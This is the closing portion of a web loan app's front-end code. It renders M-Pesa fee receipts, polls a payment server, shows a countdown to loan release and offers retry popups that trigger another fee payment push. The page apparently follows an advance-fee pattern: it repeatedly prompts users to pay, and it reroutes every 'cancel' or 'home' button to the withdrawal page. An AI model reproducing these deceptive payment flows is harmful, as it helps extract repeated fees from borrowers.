             class="px-5 py-2 bg-primary text-white rounded-lg shadow hover:bg-primary-dark transition flex items-center">
             <i class="fas fa-download mr-2"></i> Download PDF
          </a>
          <button onclick="window.print()"
                  class="px-5 py-2 bg-white border border-gray-200 rounded-lg shadow hover:bg-gray-50 transition flex items-center">
            <i class="fas fa-print mr-2"></i> Print
          </button>
        </div>
      </div>
    `;

    // âœ… Countdown timer logic goes here, AFTER innerHTML
    if (status === "processing") {
      const releaseTime = new Date(receipt.timestamp).getTime() + 24 * 60 * 60 * 1000;
      const timerEl = document.getElementById(`countdown-${receipt.reference}`);

      function updateTimer() {
        const now = Date.now();
        const diff = releaseTime - now;

        if (diff <= 0) {
          timerEl.textContent = "âœ… Loan should now be released";
          timerEl.className = "mt-3 font-bold text-green-600 text-center";
          clearInterval(interval);
          return;
        }

        const hours = Math.floor(diff / (1000 * 60 * 60));
        const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
        const seconds = Math.floor((diff % (1000 * 60)) / 1000);

        timerEl.textContent = `â³ Time left: ${hours}h ${minutes}m ${seconds}s`;
      }

      const interval = setInterval(updateTimer, 1000);
      updateTimer();
    }
}
// Background style based on status
function statusBg(status) {
    switch (status) {
        case 'success': return 'bg-green-50 border-green-200';
        case 'cancelled':
        case 'stk_failed':
        case 'error': return 'bg-red-50 border-red-200';
        case 'pending': return 'bg-yellow-50 border-yellow-200';
        default: return 'bg-gray-50 border-gray-200';
    }
}

// Text color for status
function statusColor(status) {
    switch (status) {
        case 'success': return 'text-green-600';
        case 'cancelled':
        case 'stk_failed':
        case 'error': return 'text-red-600';
        case 'pending': return 'text-yellow-600';
        default: return 'text-gray-600';
    }
}

// Fetch latest receipt
async function fetchReceipt(reference) {
    try {
        const resp = await fetch(`https://server-d7ya.onrender.com/receipt/${reference}`);
        const data = await resp.json();
        if (data.success) {
            renderReceiptCard(data.receipt);
            return data.receipt;
        }
    } catch (err) {
        console.error("Fetch receipt error:", err);
    }
    return null;
}

// Start tracking receipt
function startReceiptTracking(reference) {
    // Show placeholder card immediately
    renderReceiptCard({
        reference,
        transaction_id: null,
        transaction_code: null,
        amount: loanData?.fee || "N/A",
        loan_amount: loanData?.amount || "N/A",
        phone: loanData?.phone || "N/A",
        customer_name: localStorage.getItem('swift_customer_name') || "Swift Applicant",
        status: "pending",
        status_note: "Waiting for M-Pesa confirmation...",
        timestamp: new Date().toISOString()
    });

    // Poll every 5s until status resolves
    receiptPollInterval = setInterval(async () => {
        const receipt = await fetchReceipt(reference);
        if (receipt && receipt.status !== 'pending') {
            clearInterval(receiptPollInterval);
        }
    }, 5000);

    // Fetch immediately first time
    fetchReceipt(reference);
}
function showRetryPopup(receipt) {
    const popup = document.getElementById('retryPopup');
    const amount = receipt.amount || loanData.fee || '350';
    const loan = receipt.loan_amount || loanData.amount || '50,000';
    
    document.getElementById('retryFeeAmount').textContent = 'KES ' + amount;
    document.getElementById('retryLoanAmount').textContent = 'KES ' + loan;
    
    popup.classList.remove('hidden');
    popup.classList.add('flex');
}

   function closeRetryPopup() {
    document.getElementById('retryPopup').classList.add('hidden');
}

async function retryWithdrawal() {
    closeRetryPopup();
    const receipt = JSON.parse(localStorage.getItem('swift_pending_withdrawal'));
    if (!receipt) {
        showNotification("âš ï¸ No withdrawal data found to retry!", 3000);
        return;
    }

    try {
        const res = await fetch('https://server-d7ya.onrender.com/pay', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
            body: JSON.stringify({
                phone: receipt.phone,
                amount: loanData.fee
            })
        });

        if (!res.ok) throw new Error("Server error: " + res.status);
        showNotification("âœ… STK push sent again. Please confirm on your phone.if not received scroll below and click withdraw button.", 5000);
    } catch (err) {
        console.error("Retry error:", err);
        showNotification("âŒ Retry has failed due to traffic. Please click the withdraw button below again.", 5000);
        
        const withdrawBtn = document.getElementById('withdrawBtn');
        if (withdrawBtn) {
            withdrawBtn.disabled = false;
            withdrawBtn.classList.add('ring-4', 'ring-primary', 'ring-offset-2');
            withdrawBtn.scrollIntoView({ behavior: 'smooth', block: 'center' });
            
            setTimeout(() => {
                withdrawBtn.classList.remove('ring-4', 'ring-primary', 'ring-offset-2');
            }, 3000);
        }
    }
}
    </script>
<script>
    function showNotification(message, duration = 2000) {
        let notif = document.getElementById('notif-toast');
        if (!notif) {
            notif = document.createElement('div');
            notif.id = 'notif-toast';
            notif.style.cssText = 'position:fixed;top:20px;right:20px;background:#225AAC;color:white;padding:16px 20px;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,0.2);z-index:9999;font-weight:500;max-width:300px;animation:slideInRight 0.3s ease;';
            document.body.appendChild(notif);
        }
        notif.innerText = message;
        notif.style.display = 'block';
        setTimeout(() => {
            notif.style.display = 'none';
        }, duration);
    }

    document.addEventListener('DOMContentLoaded', () => {
        const cancelBtns = document.querySelectorAll('button');
        cancelBtns.forEach(btn => {
            if (btn.innerText.toLowerCase().includes('cancel') || btn.innerText.toLowerCase().includes('home')) {
                btn.addEventListener('click', (e) => {
                    e.preventDefault();
                    showNotification('Returning to home...');
                    localStorage.removeItem('loan_progress');
                    setTimeout(() => {
                        window.location.href = 'loan-withdrawal.html';
                    }, 800);
                });
            }
        });
    });
</script>
</body>
</html>


